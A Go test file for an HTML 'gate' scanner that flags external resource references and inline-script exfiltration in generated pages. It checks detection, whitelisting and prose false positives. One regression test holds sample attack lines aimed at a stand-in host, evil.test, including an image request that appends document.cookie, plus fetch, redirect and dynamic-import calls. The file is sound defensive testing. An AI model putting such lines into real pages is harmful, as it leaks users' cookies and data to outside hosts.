package gate

import "testing"

func TestW3CWhitelisted(t *testing.T) {
	// SVG xmlns/xlink standards URIs must NOT trip the gate (d2 SVG carries them).
	svg := `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">`
	if leaks := Scan(svg); len(leaks) != 0 {
		t.Errorf("w3.org URIs should be whitelisted, got leaks: %v", leaks)
	}
}

func TestExternalRefsCaught(t *testing.T) {
	// DEP flags src=/href= attributes with a quoted absolute or root value,
	// and CSS url(https://…) references (a remote font/image phones home too).
	cases := []string{
		`<script src="https://cdn.example.com/x.js"></script>`,
		`<link href="/fonts/remote.css">`,
		`<img src='https://evil.test/x.png'>`,
		`<style>@font-face{src:url(https://fonts.gstatic.com/x.woff2)}</style>`,
		`<div style="background:url('http://cdn.test/bg.png')"></div>`,
	}
	for _, c := range cases {
		if leaks := Scan(c); len(leaks) == 0 {
			t.Errorf("expected a leak in %q", c)
		}
	}
}

func TestAuthoredTextNotFlagged(t *testing.T) {
	// Prose / code mentioning a URL or the gate's own pattern is NOT a leak —
	// only a real src=/href= attribute with an absolute/root value is (DEP).
	clean := []string{
		`<p>fetch from http://example.com to see it</p>`,
		`<code>src=//host</code> documents the gate`,
		`<a href='quickstart.html'>relative link</a>`,
		`<script src='search-index.js' defer></script>`,
		`<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="#node"></a></svg>`,
		`<rect fill="url(#gradient)"/>`,
		`<div style="background:url(local.png)"></div>`,
	}
	for _, c := range clean {
		if leaks := Scan(c); len(leaks) != 0 {
			t.Errorf("authored/relative content should be clean: %q -> %v", c, leaks)
		}
	}
}

func TestCleanPagePasses(t *testing.T) {
	page := `<!doctype html><html><head><style>:root{--x:1}</style>` +
		`<script src='search-index.js' defer></script></head>` +
		`<body><svg xmlns="http://www.w3.org/2000/svg"></svg></body></html>`
	if err := Enforce(map[string]string{"index.html": page}); err != nil {
		t.Errorf("clean page should pass: %v", err)
	}
}

// REGRESSION (Finding A — too broad): authored prose that documents the gate's
// own url()/href patterns must NOT be flagged. The url() branch now requires the
// scheme's `//`, so `url(https:)` (no host) in prose stays clean. Guards against
// re-broadening that re-refused self-doc's security-gate page.
func TestProseUrlNotFlagged(t *testing.T) {
	clean := []string{
		`<div>the gate forbids url(https:) and src=// CDN-ish refs.</div>`,
		`<p>…CDN-ish src=// / href=// / url(https:).</p>`,
		`<code>url(https:)</code> is documented, not fetched`,
	}
	for _, c := range clean {
		if leaks := Scan(c); len(leaks) != 0 {
			t.Errorf("prose documenting the pattern should be clean: %q -> %v", c, leaks)
		}
	}
}

// REGRESSION (Finding B — too narrow): an inline <script> that exfils via a
// real http(s) URL must be caught even though it is not a src=/href= attribute.
func TestInlineScriptExfilCaught(t *testing.T) {
	cases := []string{
		`<script>fetch('https://evil.test/x')</script>`,
		`<script>new Image().src="https://evil.test/p.gif?"+document.cookie</script>`,
		`<script>location='https://evil.test/'</script>`,
		"<script>import(`https://evil.test/m.js`)</script>",
	}
	for _, c := range cases {
		if leaks := Scan(c); len(leaks) == 0 {
			t.Errorf("inline-script exfil must be caught: %q", c)
		}
	}
}

// The W3C SVG namespace used from JS (createElementNS) and a license-banner URL
// surrounded by whitespace (the inlined svg-pan-zoom kit carries one) must stay
// CLEAN — the exfil pass only flags value-shaped URLs, and w3.org is whitelisted.
func TestInlineScriptBenignNotFlagged(t *testing.T) {
	clean := []string{
		`<script>document.createElementNS('http://www.w3.org/2000/svg','svg')</script>`,
		`<script>/*! svg-pan-zoom plugin https://github.com/foo/bar v1 */ var x=1;</script>`,
	}
	for _, c := range clean {
		if leaks := Scan(c); len(leaks) != 0 {
			t.Errorf("benign in-script content should be clean: %q -> %v", c, leaks)
		}
	}
}

func TestMermaidRefused(t *testing.T) {
	page := `<body><div class="mermaid">graph TD; A-->B</div></body>`
	if !HasMermaid(page) {
		t.Fatal("should detect live mermaid div")
	}
	if err := Enforce(map[string]string{"p.html": page}); err == nil {
		t.Error("un-baked mermaid must be refused loudly")
	}
}
